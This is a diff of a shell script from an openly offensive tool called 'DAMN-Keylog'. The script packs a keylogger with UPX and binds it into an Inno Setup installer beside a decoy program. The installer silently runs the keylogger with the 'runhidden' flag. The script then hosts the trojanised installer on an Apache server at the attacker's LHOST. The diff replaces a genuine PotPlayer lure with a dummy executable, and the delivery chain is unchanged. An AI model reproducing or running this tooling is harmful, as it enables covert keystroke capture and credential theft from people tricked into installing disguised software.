@@ -37,10 +37,8 @@ generate_keylogger() {
   echo "Packing the executable with UPX..."
   upx --best --lzma keylogger.exe
 
-  echo "Compilation and packing completed. The keylogger executable is keylogger.exe"
-
-  echo "Downloading PotPlayer setup..."
-  wget https://t1.daumcdn.net/potplayer/PotPlayer/Version/Latest/PotPlayerSetup.exe -O PotPlayerSetup.exe
+  echo "Compiling the dummy executable..."
+  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ dummy.cpp -o dummy.exe
 
   echo "Creating Inno Setup script..."
   cat <<EOF > installer.iss
@@ -49,16 +47,16 @@ AppName=DAMN-Keylog
 AppVersion=1.0
 DefaultDirName={pf}\DAMN-Keylog
 DefaultGroupName=DAMN-Keylog
-OutputBaseFilename=PotPlayerSetupBound
+OutputBaseFilename=SetupBound
 Compression=lzma
 SolidCompression=yes
 
 [Files]
-Source: "PotPlayerSetup.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "dummy.exe"; DestDir: "{app}"; Flags: ignoreversion
 Source: "keylogger.exe"; DestDir: "{app}"; Flags: ignoreversion
 
 [Run]
-Filename: "{app}\PotPlayerSetup.exe"; Description: "Install PotPlayer"; Flags: nowait postinstall
+Filename: "{app}\dummy.exe"; Description: "Run Dummy"; Flags: nowait postinstall
 Filename: "{app}\keylogger.exe"; Description: "Run Keylogger"; Flags: nowait postinstall shellexec runhidden
 EOF
 
@@ -66,12 +64,12 @@ EOF
   wine "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" installer.iss
 
   echo "Moving the bound setup executable to the Apache server directory..."
-  sudo mv PotPlayerSetupBound.exe /var/www/html/
+  sudo mv SetupBound.exe /var/www/html/
 
   echo "Starting Apache server..."
   sudo systemctl start apache2
 
-  echo "The bound setup is available at: http://$LHOST/PotPlayerSetupBound.exe"
+  echo "The bound setup is available at: http://$LHOST/SetupBound.exe"
 }
 
 # Function to start the Python server
